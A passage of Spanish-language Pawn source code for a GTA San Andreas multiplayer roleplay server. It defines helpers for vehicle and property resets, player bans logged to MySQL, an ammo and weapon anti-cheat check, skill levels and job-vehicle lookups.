	x = CreateVehicleEx(autos[x][cModel], 490.0000, -4900.0000, 1000.0000, 359.5519, 1, 1, 3600000);

	format(autos[x][cOwner], 24, "Sin Dueño");
	format(autos[x][cName], 24, "Sin Nombre");

	autos[x][cLocationx] = 490.0000;
	autos[x][cLocationy] = 4900.0000;
	autos[x][cLocationz] = 1000.0000;
	autos[x][cOwned] = 0;
	autos[x][cBattery] = 10000;
	autos[x][cSpoiler] = 0;
	autos[x][cHood] = 0;
	autos[x][cRoof] = 0;
	autos[x][cSideskirt] = 0;
	autos[x][cNitro] = 0;
	autos[x][cLamps] = 0;
	autos[x][cExhaust] = 0;
	autos[x][cWheel] = 0;
	autos[x][cHydraulics] = 0;
	autos[x][cPaintjob] = 0;
	autos[x][cFrontBumper] = 0;
	autos[x][cRearBumper] = 0;
	autos[x][cVents] = 0;
	autos[x][cEmbargo] = 0;
	autos[x][cMulta] = 0;
	SetVehicleVirtualWorld(x, 1);
	ActualizaVehiculo(x);
	return 1;
}
Funcion.VenderPropiedad(playerid, x)
{
	if(playerid != INVALID_PLAYER_ID)
	{
		cuenta[playerid][cMateriales] += casa[x][hMats];
		cuenta[playerid][cDrogas] += casa[x][hDrugs];
		cuenta[playerid][cSpeed] += casa[x][hSpeed];
		cuenta[playerid][cExtasis] += casa[x][hEctasy];
		cuenta[playerid][cRitalin] += casa[x][hRitalin];
		cuenta[playerid][cHeroina] += casa[x][hHeroina];
		cuenta[playerid][cMarihuana] += casa[x][hMarihuana];
		PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
	}
	casa[x][hLock] = 0;
	casa[x][hOwned] = 0;
	casa[x][hRent] = 0;
	casa[x][hTime] = 0;
	casa[x][hRentabil] = 0;
	casa[x][hWep] = 0;
	casa[x][hAmmo] = 0;
	casa[x][hMats] = 0;
	casa[x][hDrugs] = 0;
	casa[x][hSpeed] = 0;
	casa[x][hEctasy] = 0;
	casa[x][hRitalin] = 0;
	casa[x][hHeroina] = 0;
	casa[x][hMarihuana] = 0;
	format(casa[x][hOwner], 24, "El Estado");
	OnPropTextdrawUpdate(x);
	return 1;
}
//
Funcion.VenderLocal(x)
{
	negocio[x][bOwned] = 0;
	strmid(negocio[x][bOwner], "Sin Propietario", 0, strlen("Sin Propietario"), 24);
	strmid(negocio[x][bExtortion], "Sin Extorsionista", 0, strlen("Sin Extorsionista"), 24);
	strmid(negocio[x][bUbicacion], "Asignar", 0, strlen("Asignar"), 24);
	strmid(negocio[x][bEmpresa], "Asignar", 0, strlen("Asignar"), 24);
	negocio[x][bProduc] = 100;
	negocio[x][bTill] = 0;
	negocio[x][bTillEx] = 0;
	negocio[x][bcostenter] = 0;
	negocio[x][bTime] = 0;
	OnBizzTextdrawUpdate(x);
	return 1;
}
//
Funcion.MensajeAmbos(jugador1, jugador2, const color, const string[])
{
	Mensaje(jugador1, color, string);
	Mensaje(jugador2, color, string);
	return 1;
}
//
Funcion.PrimeraPersonaON(playerid)
{
    entero[playerid][PPobjeto] = CreateObject(19300, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
    AttachObjectToPlayer(entero[playerid][PPobjeto], playerid, 0.0, 0.12, 0.7, 0.0, 0.0, 0.0);
    AttachCameraToObject(playerid, entero[playerid][PPobjeto]);    
	booleano[PPersona]{playerid} = true;
    return 1;
}
//
Funcion.PrimeraPersonaOFF(playerid)
{
	SetCameraBehindPlayer(playerid);
	DestroyObject(entero[playerid][PPobjeto]);    
	booleano[PPersona]{playerid} = false;
	return 1;
}
//
Funcion.GetWeaponSlot(weaponid)
{
	new slot;
	switch(weaponid)
	{
		case 0, 1: slot = 0;
		case 2 .. 9: slot = 1;
		case 10 .. 15: slot = 10;
		case 16 .. 18, 39: slot = 8;
		case 22 .. 24: slot = 2;
		case 25 .. 27: slot = 3;
		case 28, 29, 32: slot = 4;
		case 30, 31: slot = 5;
		case 33, 34: slot = 6;
		case 35 .. 38: slot = 7;
		case 40: slot = 12;
		case 41 .. 43: slot = 9;
		case 44 .. 46: slot = 11;
	}
	return slot;
}
//
Funcion.EsZonaPrivada(playerid)
{	
	new Float:ipos[3];
	GetPlayerPos(playerid, ipos[0], ipos[1], ipos[2]);
	for(new x=0;x<sizeof(zonaPrivada);x++)
	{
		if(ipos[0] > zonaPrivada[x][0] && ipos[0] < zonaPrivada[x][2] && ipos[1] > zonaPrivada[x][1] && ipos[1] < zonaPrivada[x][3])return true;
	}
	return false;
}
//
Funcion.ban(playerid, razon[], admin[], codigo[])
{
	new tmp[256], tmp2[16], tmp3[800], ping;
	GetPlayerIp(playerid, tmp2, sizeof(tmp2));
	ping = GetPlayerPing(playerid);
	
	format(tmp3, sizeof(tmp3), "~y~Nombre: ~w~%s                    ~y~Razon: ~w~%s~n~~y~IP: ~w~%s                    ~y~Admin: ~w~%s~n~~y~Tiempo: ~w~Permanente                    ~y~Hexa: ~w~0x%dAA~n~~y~Fecha: ~w~%s                    ~y~Codigo: ~w~%s", Nombre(playerid), razon, tmp2, admin, ping, ObtenerFecha(), codigo);
	TextDrawSetString(TextdBan[2], tmp3);
	
	TextDrawShowForPlayer(playerid, TextdBan[0]);
	TextDrawShowForPlayer(playerid, TextdBan[1]);
	TextDrawShowForPlayer(playerid, TextdBan[2]);
	
	mysql_format(servidor[mysqlControl], tmp, sizeof(tmp), "INSERT INTO zz_tablaip(ipaddress, razon, fecha, nombre) VALUES('%s', '%s', '%s', '%s');", tmp2, razon, ObtenerFecha(), Nombre(playerid));
	mysql_query(servidor[mysqlControl], tmp, false);
	return Kick(playerid);
}
//
Funcion.ObtenerNombreRango(famid, rangoid)
{
	new string[24];
	switch(rangoid)
	{
		case 1: format(string, sizeof(string), "%s", familias[famid][fRango0]);
		case 2: format(string, sizeof(string), "%s", familias[famid][fRango1]);
		case 3: format(string, sizeof(string), "%s", familias[famid][fRango2]);
		case 4: format(string, sizeof(string), "%s", familias[famid][fRango3]);
		case 5: format(string, sizeof(string), "%s", familias[famid][fRango4]);
		case 6: format(string, sizeof(string), "%s", familias[famid][fRango5]);
	}
	return string;
}
Funcion.obtenerNivel(playerid, skillid)
{
	new inivel;
	switch(cuenta[playerid][cSkills][skillid])
	{
		case 0 .. 10: inivel = 1;
		case 11 .. 30: inivel = 2;
		case 31 .. 60: inivel = 3;
		case 61 .. 90: inivel = 4;
		case 91 .. 120: inivel = 5;
		case 121 .. 160: inivel = 6;
		case 161 .. 200: inivel = 7;
		case 201 .. 280: inivel = 8;
		case 281 .. 370: inivel = 9;
		case 371 .. 1000: inivel = 10;
	}
	return inivel;
}
Funcion.GiveSkillPlayer(playerid, skillid)
{
	switch(skillid)
	{
		case 0:
		{
			if(cuenta[playerid][cSkills][0] < 1000)
			{
				cuenta[playerid][cSkills][0]++;
				if(cuenta[playerid][cPackID] == 1) cuenta[playerid][cSkills][0] += 3;
				else if(cuenta[playerid][cPackID] == 2) cuenta[playerid][cSkills][0] += 6;
			}
		}
		case 1:
		{
			if(cuenta[playerid][cSkills][1] < 1000)
			{
				cuenta[playerid][cSkills][1]++;
				if(cuenta[playerid][cPackID] == 1) cuenta[playerid][cSkills][1] += 3;
				else if(cuenta[playerid][cPackID] == 2) cuenta[playerid][cSkills][1] += 6;
			}
		}
		case 2:
		{
			if(cuenta[playerid][cSkills][2] < 1000)
			{
				cuenta[playerid][cSkills][2]++;
				if(cuenta[playerid][cPackID] == 1) cuenta[playerid][cSkills][2] += 3;
				else if(cuenta[playerid][cPackID] == 2) cuenta[playerid][cSkills][2] += 6;
			}
		}
		case 3:{
			if(cuenta[playerid][cSkills][3] < 1000){
				cuenta[playerid][cSkills][3]++;
				if(cuenta[playerid][cPackID] == 1) cuenta[playerid][cSkills][3] += 3;
				else if(cuenta[playerid][cPackID] == 2) cuenta[playerid][cSkills][3] += 6;
			}
		}
		case 4:{
			if(cuenta[playerid][cSkills][4] < 1000){
				cuenta[playerid][cSkills][4]++;
				if(cuenta[playerid][cPackID] == 1) cuenta[playerid][cSkills][4] += 3;
				else if(cuenta[playerid][cPackID] == 2) cuenta[playerid][cSkills][4] += 6;
			}
		}
		case 5:{
			if(cuenta[playerid][cSkills][5] < 1000){
				cuenta[playerid][cSkills][5]++;
				if(cuenta[playerid][cPackID] == 1) cuenta[playerid][cSkills][5] += 3;
				else if(cuenta[playerid][cPackID] == 2) cuenta[playerid][cSkills][5] += 6;
			}
		}
		case 6:{
			if(cuenta[playerid][cSkills][6] < 1000){
				cuenta[playerid][cSkills][6]++;
				if(cuenta[playerid][cPackID] == 1) cuenta[playerid][cSkills][6] += 3;
				else if(cuenta[playerid][cPackID] == 2) cuenta[playerid][cSkills][6] += 6;
			}
		}
		case 7:{
			if(cuenta[playerid][cSkills][7] < 1000){
				cuenta[playerid][cSkills][7]++;
				if(cuenta[playerid][cPackID] == 1) cuenta[playerid][cSkills][7] += 3;
				else if(cuenta[playerid][cPackID] == 2) cuenta[playerid][cSkills][7] += 6;
			}
		}
		case 8:{
			if(cuenta[playerid][cSkills][8] < 1000){
				cuenta[playerid][cSkills][8]++;
				if(cuenta[playerid][cPackID] == 1) cuenta[playerid][cSkills][8] += 3;
				else if(cuenta[playerid][cPackID] == 2) cuenta[playerid][cSkills][8] += 6;
			}
		}
		case 9:{
			if(cuenta[playerid][cSkills][9] < 1000){
				cuenta[playerid][cSkills][9]++;
				if(cuenta[playerid][cPackID] == 1) cuenta[playerid][cSkills][9] += 3;
				else if(cuenta[playerid][cPackID] == 2) cuenta[playerid][cSkills][9] += 6;
			}
		}
		case 10:{
			if(cuenta[playerid][cSkills][10] < 1000){
				cuenta[playerid][cSkills][10]++;
				if(cuenta[playerid][cPackID] == 1) cuenta[playerid][cSkills][10] += 3;
				else if(cuenta[playerid][cPackID] == 2) cuenta[playerid][cSkills][10] += 6;
			}
		}
		case 11:{
			if(cuenta[playerid][cSkills][11] < 1000){
				cuenta[playerid][cSkills][11]++;
				if(cuenta[playerid][cPackID] == 1) cuenta[playerid][cSkills][11] += 3;
				else if(cuenta[playerid][cPackID] == 2) cuenta[playerid][cSkills][11] += 6;
			}
		}
		case 12:{
			if(cuenta[playerid][cSkills][12] < 1000){
				cuenta[playerid][cSkills][12]++;
				if(cuenta[playerid][cPackID] == 1) cuenta[playerid][cSkills][12] += 3;
				else if(cuenta[playerid][cPackID] == 2) cuenta[playerid][cSkills][12] += 6;
			}
		}
	}
	return 1;
}
Funcion.AccionMe(playerid, accion[])
{
	new string[256];
	if(Maskuse[playerid])
	{
		format(string, sizeof(string), "* Desconocido %s.", accion);
	}
	else
	{
		format(string, sizeof(string), "* %s %s.", PlayerName(playerid), accion);
	}
	return ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
}
Funcion.AccionDo(playerid, accion[])
{
	new string[256];	
	if(Maskuse[playerid])
	{
		format(string, sizeof(string), "* Desconocido (( %s )).", accion);
	}
	else
	{
		format(string, sizeof(string), "* %s (( %s )).", PlayerName(playerid), accion);
	}
	return ProxDetector(30.0, playerid, string, 0xB6DB22FF, 0xB6DB22FF, 0xB6DB22FF, 0xB6DB22FF, 0xB6DB22FF);
}
Funcion.IsLocolowVehicle(veh)
{
	new model = GetVehicleModel(veh);
    switch(model)
	{
        case 412, 534, 535, 536, 566, 567, 576: return true;
    }
    return false;
}
Funcion.IsWAAVehicle(veh)
{
    new model = GetVehicleModel(veh);
    switch(model)
	{
        case 558, 559, 560, 561, 562, 565: return true;
    }
    return false;
}
Funcion.SonMotos(playerid)
{
	new model = GetVehicleModel(GetPlayerVehicleID(playerid));
    switch(model)
	{
		case 509, 481, 510, 462, 448, 581, 522, 461, 521, 523, 463, 586, 468, 471: return true;
	}
    return false;
}
Funcion.SonBarcos(veh)
{
    new model = GetVehicleModel(veh);
    switch(model)
	{
	    case 484, 454, 493, 446, 452, 487: return true;
 	}
    return false;
}
Funcion.ObtenerIdDelNombre(const partedelnombre[])
{
	new inombre[MAX_PLAYER_NAME];
    for(new i=0, t=GetMaxPlayers();i<t;i++)
	{
        GetPlayerName(i, inombre, sizeof(inombre));
        if(!strfind(inombre, partedelnombre, true)) return i;
    }
    return -1;
}
Funcion.Nombre(playerid)
{
	new tmp[MAX_PLAYER_NAME];
	GetPlayerName(playerid, tmp, sizeof(tmp));
	return tmp;
}
Funcion.NombreArma(weaponid)
{
	new tmp[32];
	GetWeaponName(weaponid, tmp, sizeof(tmp));
	return tmp;
}
//
Funcion.NombreDroga(droga)
{
	new tmp[12];
	switch(droga)
	{
		case 1: tmp = "Speed";
		case 2: tmp = "Extasis";
		case 3: tmp = "Ritalin";
		case 4: tmp = "Heroína";
		case 5: tmp = "Marihuana";
	}
	return tmp;
}
//
Funcion.VerificarCaducamiento(car, const name[])
{
	if(strfind(name, autos[car][cOwner], false) == -1)return true;
	return false;
}
//
//By Slice
Funcion.memset(aArray[], iValue, iSize = sizeof(aArray)){
    new
        iAddress
    ;
    
    // Store the address of the array
    #emit LOAD.S.pri 12
    #emit STOR.S.pri iAddress
    
    // Convert the size from cells to bytes
    iSize *= 4;
    
    // Loop until there is nothing more to fill
    while (iSize > 0){
        // I have to do this because the FILL instruction doesn't accept a dynamic number.
        if (iSize >= 4096){
            #emit LOAD.S.alt iAddress
            #emit LOAD.S.pri iValue
            #emit FILL 4096
        
            iSize    -= 4096;
            iAddress += 4096;
        } else if (iSize >= 1024){
            #emit LOAD.S.alt iAddress
            #emit LOAD.S.pri iValue
            #emit FILL 1024

            iSize    -= 1024;
            iAddress += 1024;
        } else if (iSize >= 256){
            #emit LOAD.S.alt iAddress
            #emit LOAD.S.pri iValue
            #emit FILL 256

            iSize    -= 256;
            iAddress += 256;
        } else if (iSize >= 64){
            #emit LOAD.S.alt iAddress
            #emit LOAD.S.pri iValue
            #emit FILL 64

            iSize    -= 64;
            iAddress += 64;
        } else if (iSize >= 16){
            #emit LOAD.S.alt iAddress
            #emit LOAD.S.pri iValue
            #emit FILL 16

            iSize    -= 16;
            iAddress += 16;
        } else {
            #emit LOAD.S.alt iAddress
            #emit LOAD.S.pri iValue
            #emit FILL 4

            iSize    -= 4;
            iAddress += 4;
        }
    }
    
    // aArray is used, just not by its symbol name
    #pragma unused aArray
}
//
Funcion.estaSilenciado(playerid)
{
	if(cuenta[playerid][cSilenciado] > gettime())
	{
		new tmp[128];
		format(tmp, sizeof(tmp), "Usted esta silenciado por %s, no insista!", ObtenerTiempoRestante(cuenta[playerid][cSilenciado]));
		Mensaje(playerid, COLOR_ROJO, tmp);
		return true;
	}
	return false;
}
//
Funcion.verificarArmaHack(playerid)
{
	new weaponid = GetPlayerWeapon(playerid), i = GetWeaponSlot(weaponid), tmp[164], tmp15[24], tmp16[32];
	GetPlayerWeaponData(playerid, i, detectarArmas2[playerid][i][0], detectarArmas2[playerid][i][1]);
	
	if(detectarArmas2[playerid][i][0] == detectarArmas[playerid][i][0])
	{
		if(IsPlayerConnected(playerid) && GetPlayerPing(playerid) < 300 && (detectarArmas2[playerid][i][1] - 3) > detectarArmas[playerid][i][1])
		{
			format(tmp, sizeof(tmp), "{ff0000}Anti-Cheat{FFFFFF}: %s[%d] fue baneado por Hack de Balas.", Nombre(playerid), playerid);
			MensajeAdmin(-1, tmp, 1);
			
			format(tmp16, sizeof(tmp16), "0xBQ%dDT%d - 0xBQ%dT%d", detectarArmas[playerid][i][1], detectarArmas[playerid][i][1] * 6, detectarArmas2[playerid][i][1], detectarArmas2[playerid][i][1] * 2);
			format(tmp15, sizeof(tmp15), "[NPC]%s", nonplayers[random(sizeof(nonplayers))][npcNombre]);
			ban(playerid, "Hack de Balas", tmp15, tmp16);
		}
		else
		{
			detectarArmas[playerid][i][0] = detectarArmas2[playerid][i][0];
			detectarArmas[playerid][i][1] = detectarArmas2[playerid][i][1];
		}
	}
	else if(IsPlayerConnected(playerid) && GetPlayerPing(playerid) < 300 && !detectarArmas[playerid][i][2])
	{
		detectarArmas[playerid][i][2] = 1;
		format(tmp, sizeof(tmp), "{ff0000}Anti-Cheat{FFFFFF}: %s[%d] fue baneado por Hack de Armas.", Nombre(playerid), playerid);
		MensajeAdmin(-1, tmp, 1);
		
		format(tmp16, sizeof(tmp16), "0xWQ%dDT%d - 0xWQ%dT%d", detectarArmas[playerid][i][0], detectarArmas[playerid][i][0] * 12, detectarArmas2[playerid][i][0], detectarArmas2[playerid][i][0] * 4);
		format(tmp15, sizeof(tmp15), "[NPC]%s", nonplayers[random(sizeof(nonplayers))][npcNombre]);
		ban(playerid, "Hack de Armas", tmp15, tmp16);
	}
	else 
	{
		detectarArmas[playerid][i][0] = detectarArmas2[playerid][i][0];
		detectarArmas[playerid][i][1] = detectarArmas2[playerid][i][1];
	}
	return 1;
}
//
Funcion.transAuto(vehicleid) {for(new i=0; i<sizeof(transCoches); i++){if(transCoches[i] == vehicleid){return true;}}return false;}
Funcion.aviadorAuto(vehicleid) {for(new i=0; i<sizeof(aviadorCoches); i++){if(aviadorCoches[i] == vehicleid){return true;}}return false;}
Funcion.camioneroAuto(vehicleid) {for(new i=0; i<sizeof(camioneroCoches); i++){if(camioneroCoches[i] == vehicleid){return true;}}return false;}
Funcion.barrenderoAuto(vehicleid) {for(new i=0; i<sizeof(barrenderoCoches); i++){if(barrenderoCoches[i] == vehicleid){return true;}}return false;}
Funcion.busesAuto(vehicleid) {for(new i=0; i<sizeof(busesCoches); i++){if(busesCoches[i] == vehicleid){return true;}}return false;}
Funcion.agricultorAuto(vehicleid) {for(new i=0; i<sizeof(agricultorCoches); i++){if(agricultorCoches[i] == vehicleid){return true;}}return false;}
Funcion.pizzaAuto(vehicleid) {for(new i=0; i<sizeof(pizzaCoches); i++){if(pizzaCoches[i] == vehicleid){return true;}}return false;}
Funcion.taxiAuto(vehicleid) {for(new i=0; i<sizeof(taxiCoches); i++){if(taxiCoches[i] == vehicleid){return true;}}return false;}
Funcion.basureroAuto(vehicleid) {for(new i=0; i<sizeof(basureroCoches); i++){if(basureroCoches[i] == vehicleid){return true;}}return false;}
Funcion.pescadorAuto(vehicleid) {for(new i=0; i<sizeof(pescadorCoches); i++){if(pescadorCoches[i] == vehicleid){return true;}}return false;}
//

#include "zz_mapas.pwn"



